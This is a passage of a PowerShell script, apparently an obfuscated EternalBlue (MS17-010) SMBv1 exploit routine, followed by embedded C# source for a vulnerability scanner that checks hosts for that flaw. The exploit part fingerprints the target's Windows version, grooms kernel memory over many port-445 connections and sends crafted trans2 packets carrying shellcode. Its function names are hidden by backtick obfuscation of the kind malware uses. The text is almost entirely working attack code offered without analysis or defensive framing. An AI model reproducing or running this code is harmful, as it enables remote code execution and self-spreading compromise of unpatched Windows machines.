x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x41,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x7e,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x41,0xd0,0xff,0xff,0xff,0xff,0xff)
    $feaList = crea`T`EfEAliST8 $sc.length  $ntfea9000

    $client = NEw-Obj`e`CT System.Net.Sockets.TcpClient($target,445)
    $sock = $client.Client
    C`LIe`Nt_n`EgO`TI`ATe8 $sock $true | o`Ut`-nULl
    $raw, $smbheader = SmB`1_`LOgin8 $sock
    $os=[system.Text.Encoding]::ascii.GetString($raw[45..($raw.count-1)]).ToLower()
	if ($os.contains(('w'+'indows '+'10 ')))
    {
        $b=[int]$os.split(" ")[-1]
        if ($b -ge 14393) {return $False}
    }

    if (!(($os.contains(('window'+'s '+'8'))) -or ($os.contains(('w'+'ind'+'ows')) -and $os.contains(('201'+'2')))))
    {return $False}
	$sock.ReceiveTimeout =5000
    $raw, $smbheader = T`ReE_coN`NecT`_anDX8 $sock $target $smbheader.user_id


    $progress , $timeout= SEnd_big_`Tr`AN`S28 $sock $smbheader $feaList ($feaList.length%4096) $False
    if (($progress -eq -1) -and ($timeout -eq -1))
    {return $false}

    $client2 = New`-O`BJECt System.Net.Sockets.TcpClient($target,445)
    $sock2 = $client2.Client
    ClieN`T`_`NeGOTiAte8 $sock2 $true | oUT-N`U`LL
    $raw, $smbheader_t = S`Mb`1_LOg`in8 $sock2
    $raw, $smbheader2 = T`Ree_CoNnECT`_`ANDx8 $sock2 $target $smbheader_t.user_id
    $progress2 , $timeout2= sEn`d`_biG_Tr`Ans28 $sock2 $smbheader2 $feaListNx ($feaList.length%4096) $False
    if (($progress2 -eq -1) -and ($timeout2 -eq -1))
    {return $false}


    $allocConn = c`RE`ATESe`ssioNA`LlOCNONpA`ge`D8 $target ($NTFEA_SIZE8 - 0x2010)

     $payload_hdr_pkt = ma`KE_SM`B2_P`A`Yl`oaD_HEaDE`R`S`_pACKEt8($true)
     $groom_socks =@()
     for ($i=0; $i -lt 13; $i++)
     {
        $client = n`EW-ob`JecT System.Net.Sockets.TcpClient($target,445)
        $client.NoDelay = $true
        $gsock = $client.Client
        $groom_socks += $gsock
        $gsock.Send($payload_hdr_pkt) | o`Ut-nU`LL
     }
    $holeConn = CreAtesEsS`I`oNA`l`LOCn`oNpAGEd8 $target ($NTFEA_SIZE8 - 0x10)
    $allocConn.close()
    for ($i=0; $i -lt 5; $i++)
     {
         $client = NEW-o`Bj`eCT System.Net.Sockets.TcpClient($target,445)
         $client.NoDelay = $true
         $gsock = $client.Client
         $groom_socks += $gsock
         $gsock.Send($payload_hdr_pkt) | ou`T-nu`ll
     }
    $holeConn.close()

    $trans2_pkt2 = Mak`e_SM`B1_`TRans2_ExPlo`IT_P`ACKET8 $smbheader2.tree_id $smbheader2.user_id $feaListNx[$progress2..$feaListNx.count] $timeout2
    $sock2.Send($trans2_pkt2) | ou`T`-nuLl
    $raw2, $transheader2 = Sm`B1_gE`T_REs`pO`Ns`e8($sock2)
    if ($raw2 -eq -1 -and ($transheader2 -eq -1)){return $false}
    foreach ($sk in $groom_socks)
    {
        $sk.Send([byte[]]0x00) | oU`T-`NuLL
    }

    $trans2_pkt =MAkE_smB1`_Tra`NS2_eX`plO`IT_`pAc`Ke`T8 $smbheader.tree_id $smbheader.user_id $feaList[$progress..$feaList.count] $timeout
    $sock.Send($trans2_pkt) | ouT`-nu`Ll
    $raw, $transheader = sM`B`1_Get_ReSP`onse8($sock)
    if ($raw -eq -1 -and ($transheader -eq -1)){return $false}
    foreach ($sk in $groom_socks)
    {
        $sk.Send($fake_recv_struct + $sc) | oU`T-`NuLl
    }
     foreach ($sk in $groom_socks)
    {
        $sk.close() | oUt-nU`lL
    }
    $sock.Close()| oU`T-nULL
    return $true
  }


$Source = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace PingCastle.Scanners
{
	public class m17sc
	{
		static public bool Scan(string computer)
		{
			TcpClient client = new TcpClient();
			client.Connect(computer, 445);
			try
			{
				NetworkStream stream = client.GetStream();
				byte[] negotiatemessage = GetNegotiateMessage();
				stream.Write(negotiatemessage, 0, negotiatemessage.Length);
				stream.Flush();
				byte[] response = ReadSmbResponse(stream);
				if (!(response[8] == 0x72 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid negotiate response");
				}
				byte[] sessionSetup = GetSessionSetupAndXRequest(response);
				stream.Write(sessionSetup, 0, sessionSetup.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (!(response[8] == 0x73 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid sessionSetup response");
				}
				byte[] treeconnect = GetTreeConnectAndXRequest(response, computer);
				stream.Write(treeconnect, 0, treeconnect.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (!(response[8] == 0x75 && response[9] == 00))
				{
					throw new InvalidOperationException("invalid TreeConnect response");
				}
				byte[] peeknamedpipe = GetPeekNamedPipe(response);
				stream.Write(peeknamedpipe, 0, peeknamedpipe.Length);
				stream.Flush();
				response = ReadSmbResponse(stream);
				if (response[8] == 0x25 && response[9] == 0x05 && response[10] ==0x02 && response[11] ==0x00 && response[12] ==0xc0 )
				{
					return true;
				}
			}
			catch (Exception)
			{
				throw;
			}
			return false;
		}

		private static byte[] ReadSmbResponse(NetworkStream stream)
		{
			byte[] temp = new byte[4];
			stream.Read(temp, 0, 4);
			int size = temp[3] + temp[2] * 0x100 + temp[3] * 0x10000;
			byte[] output = new byte[size + 4];
			stream.Read(output, 4, size);
			Array.Copy(temp, output, 4);
			return output;
		}

		static byte[] GetNegotiateMessage()
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00,
				0xff,0x53,0x4d,0x42,
				0x72,
				0x00,
				0x00,
				0x00,0x00,
				0x18,
				0x01,0x28,
				0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,
				0x00,0x00,
				0x44,0x6d,
				0x00,0x00,
				0x42,0xc1,
				0x00,
				0x31,0x00,
				0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x31,0x2e,0x30,0x00,
				0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,0x32,0x00,
				0x02,0x4e,0x54,0x20,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x20,0x31,0x2e,0x30,0x00,
				0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00,
			};
			return EncodeNetBiosLength(output);
		}

		static byte[] GetSessionSetupAndXRequest(byte[] data)
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00,
				0xff,0x53,0x4d,0x42,
				0x73,
				0x00,
				0x00,
				0x00,0x00,
				0x18,
				0x01,0x28,
				0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1,
				0x0d,
				0xff,
				0x00,
				0x00,0x00,
				0xdf,0xff,
				0x02,0x00,
				0x01,0x00,
				0x00,0x00,0x00,0x00,
				0x00,0x00,
				0x00,0x00,
				0x00,0x00,0x00,0x00,
				0x40,0x00,0x00,0x00,
				0x26,0x00,
				0x00,
				0x2e,0x00,
				0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x32,0x31,0x39,0x35,0x00,
				0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x35,0x2e,0x30,0x00
			};
			return EncodeNetBiosLength(output);
		}

		private static byte[] EncodeNetBiosLength(byte[] input)
		{
			byte[] len = BitConverter.GetBytes(input.Length-4);
			input[3] = len[0];
			input[2] = len[1];
			input[1] = len[2];
			return input;
		}

		static byte[] GetTreeConnectAndXRequest(byte[] data, string computer)
		{
			MemoryStream ms = new MemoryStream();
			BinaryReader reader = new BinaryReader(ms);
			byte[] part1 = new byte[] {
				0x00,0x00,0x00,0x00,
				0xff,0x53,0x4d,0x42,
				0x75,
				0x00,
				0x00,
				0x00,0x00,
				0x18,
				0x01,0x28,
				0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1,
				0x04,
				0xff,
				0x00,
				0x00,0x00,
				0x00,0x00,
				0x01,0x00,
				0x19,0x00,
				0x00,
				0x5c,0x5c};
			byte[] part2 = new byte[] {
				0x5c,0x49,0x50,0x43,0x24,0x00,
				0x3f,0x3f,0x3f,0x3f,0x3f,0x00
			};
			ms.Write(part1, 0, part1.Length);
			byte[] encodedcomputer = new ASCIIEncoding().GetBytes(computer);
			ms.Write(encodedcomputer, 0, encodedcomputer.Length);
			ms.Write(part2, 0, part2.Length);
			ms.Seek(0, SeekOrigin.Begin);
			byte[] output = reader.ReadBytes((int) reader.BaseStream.Length);
			return EncodeNetBiosLength(output);
		}

		static byte[] GetPeekNamedPipe(byte[] data)
		{
			byte[] output = new byte[] {
				0x00,0x00,0x00,0x00,
				0xff,0x53,0x4d,0x42,
				0x25,
				0x00,
				0x00,
				0x00,0x00,
				0x18,
				0x01,0x28,
				0x00,0x00,
				0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x00,0x00,
				data[28],data[29],data[30],data[31],data[32],data[33],
				0x42,0xc1,
				0x10,
				0x00,0x00,
				0x00,0x00,
				0xff,0xff,
				0xff,0xff,
				0x00,
				0x00,
				0x00,0x00,
				0x00,0x00,0x00,0x00,
				0x00,0x00,
				0x00,0x00,
				0x4a,0x00,
				0x00,0x00,
				0x4a,0x00,
				0x02,
				0x00,
				0x23,0x00,
				0x00,0x00,
				0x07,0x00,
				0x5c,0x50,0x49,0x50,0x45,0x5c,0x00
			};
			return EncodeNetBiosLength(output);
		}
	}
}
"@
a`dd`-TypE -TypeDefinition $Source
